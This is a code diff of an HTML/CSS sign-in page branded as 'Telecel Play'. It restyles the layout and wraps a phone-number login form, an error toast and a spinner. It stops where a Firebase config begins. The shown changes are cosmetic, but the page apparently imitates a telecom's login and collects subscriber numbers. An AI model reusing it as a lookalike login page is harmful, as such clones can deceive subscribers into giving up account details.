@@ -26,14 +26,16 @@ body{
   justify-content:center;
 }
 
-.container{
-  width:360px;
-  min-height:100vh;
-  background:#f7f7f7;
-  position:relative;
-  padding:20px;
-  overflow:hidden;
-}
+.container {
+      width: 360px;
+      background: #f7f7f7;
+      border-radius: 28px;
+      padding: 40px 20px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
+      position: relative;
+      overflow: hidden;
+      text-align: center;
+    }
 
 /* TOP RED SHAPE */
 .top-bg{
@@ -44,6 +46,12 @@ body{
   height:220px;
   background:linear-gradient(135deg, rgba(255,0,0,0.25), rgba(255,0,0,0.6));
   border-bottom-left-radius:120px;
+}
+
+/* CONTENT WRAPPER – keeps everything above the top-bg */
+.content {
+  position: relative;
+  z-index: 2;
 }
 
 /* LOGO */
@@ -96,6 +104,7 @@ body{
 /* FORM */
 .form{
   margin-top:30px;
+  text-align: left;  /* ensure labels and inputs are left‑aligned */
 }
 
 .label{
@@ -273,61 +282,67 @@ body{
 
   <div class="top-bg"></div>
 
-  <!-- ERROR TOAST (hidden by default) -->
-  <div class="error-box" id="errorBox">
-    <div class="close" onclick="hideError()">×</div>
-    <div class="error-title">Error</div>
-    <div class="error-text" id="errorMessage">Account details provided is incorrect</div>
-  </div>
+  <!-- All content goes inside this wrapper to stay above the red shape -->
+  <div class="content">
 
-  <!-- LOGO -->
-  <div class="logo">
-    <div class="logo-circle" style="color: #ffffff !important;">t</div>
-    <div class="logo-text">telecel</div>
-  </div>
+    <!-- ERROR TOAST (hidden by default) -->
+    <div class="error-box" id="errorBox">
+      <div class="close" onclick="hideError()">×</div>
+      <div class="error-title">Error</div>
+      <div class="error-text" id="errorMessage">Account details provided is incorrect</div>
+    </div>
 
-  <!-- TEXT -->
-  <div class="title">Welcome to Telecel Play</div>
-  <div class="subtitle">
-    Enter your number to sign up or log in.<br>
-    You need to be a Telecel subscriber to proceed.
-  </div>
+    <!-- LOGO -->
+    <div class="logo">
+      <div class="logo-circle" style="color: #ffffff !important;">t</div>
+      <div class="logo-text">telecel</div>
+    </div>
 
-  <!-- FORM -->
-  <div class="form">
+    <!-- TEXT -->
+    <div class="title">Welcome to Telecel Play</div>
+    <div class="subtitle">
+      Enter your number to sign up or log in.<br>
+      You need to be a Telecel subscriber to proceed.
+    </div>
 
-    <div class="label">Account type</div>
+    <!-- FORM -->
+    <div class="form">
 
-    <div class="dropdown" onclick="toggleDropdown()">
+      <div class="label">Account type</div>
 
-      <div class="select-wrapper">
-        <input class="select" id="selectedType" value="Mobile" readonly>
-        <span class="arrow" id="arrow">▼</span>
+      <div class="dropdown" onclick="toggleDropdown()">
+
+        <div class="select-wrapper">
+          <input class="select" id="selectedType" value="Mobile" readonly>
+          <span class="arrow" id="arrow">▼</span>
+        </div>
+
+        <div class="dropdown-list" id="dropdownList">
+          <div class="dropdown-item active" onclick="selectType(event,'Mobile')">Mobile</div>
+          <div class="dropdown-item" onclick="selectType(event,'Broadband')">Broadband</div>
+        </div>
+
       </div>
 
-      <div class="dropdown-list" id="dropdownList">
-        <div class="dropdown-item active" onclick="selectType(event,'Mobile')">Mobile</div>
-        <div class="dropdown-item" onclick="selectType(event,'Broadband')">Broadband</div>
-      </div>
+      <div class="label" id="inputLabel" style="margin-top:15px;">Phone Number</div>
+      <input class="input" id="inputField" placeholder="020XXXXXXX" inputmode="numeric">
+
+      <button class="btn btn-primary" onclick="submitForm()">Next</button>
+      <button class="btn btn-outline">Go Back</button>
+
+      <div class="version">v26.2.2(TPA-2622)</div>
 
     </div>
 
-    <div class="label" id="inputLabel" style="margin-top:15px;">Phone Number</div>
-    <input class="input" id="inputField" placeholder="020XXXXXXX" inputmode="numeric">
+  </div> <!-- end .content -->
 
-    <button class="btn btn-primary" onclick="submitForm()">Next</button>
-    <button class="btn btn-outline">Go Back</button>
-
-    <div class="version">v26.2.2(TPA-2622)</div>
-
-  </div>
-
-</div>
+</div> <!-- end .container -->
 
 <!-- SPINNER OVERLAY -->
 <div id="spinner">
   <div class="loader"></div>
 </div>
+
 
 <script>
   // ==================== FIREBASE CONFIG ====================
